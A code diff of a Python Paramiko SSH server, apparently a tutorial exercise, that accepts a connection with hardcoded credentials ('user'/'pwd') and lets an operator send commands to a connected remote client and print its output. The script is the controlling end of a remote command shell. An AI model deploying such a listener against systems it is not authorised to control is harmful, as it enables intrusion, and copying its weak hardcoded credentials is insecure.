@@ -2,6 +2,7 @@ import socket
 import paramiko
 import threading
 import sys
+import traceback
 
 #Paramikoのでもファイルに含まれている鍵ファイルを利用
 host_key = paramiko.RSAKey(filename='test_rsa.key')
@@ -14,7 +15,7 @@ class Server (paramiko.ServerInterface):
             return paramiko.OPEN_SUCCEEDED
         return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
     def check_auth_password(self, username, password):
-        if (username == 'Administraotr') and (password == 'invinciblepassword'):
+        if (username == 'user') and (password == 'pwd'):
             return paramiko.AUTH_SUCCESSFUL
         return paramiko.AUTH_FAILED
 
@@ -42,8 +43,10 @@ try:
     except paramiko.SSHException as x:
         print('[-]SSH negotiation failed.')
         print(str(x))
-
-    chan = bhSession.accept(20)
+    while True:
+        chan = bhSession.accept(20)
+        if not (chan is None):
+            break
     print('[+]Authenticated!')
 
     print(chan.recv(1024))
@@ -53,7 +56,7 @@ try:
             command = input('Enter command: ').strip('\n')
             if command != 'exit':
                 chan.send(command)
-                print(chan.recv(1024) + '\n')
+                print(chan.recv(1024).decode() + '\n')
             else:
                 chan.send('exit!')
                 print('exiting')
@@ -63,6 +66,8 @@ try:
             bhSession.close()
 except Exception as e:
     print('[-]Caught exception: ' + str(e))
+    print(traceback.print_exc())
+
     try:
         bhSession.close()
     except:
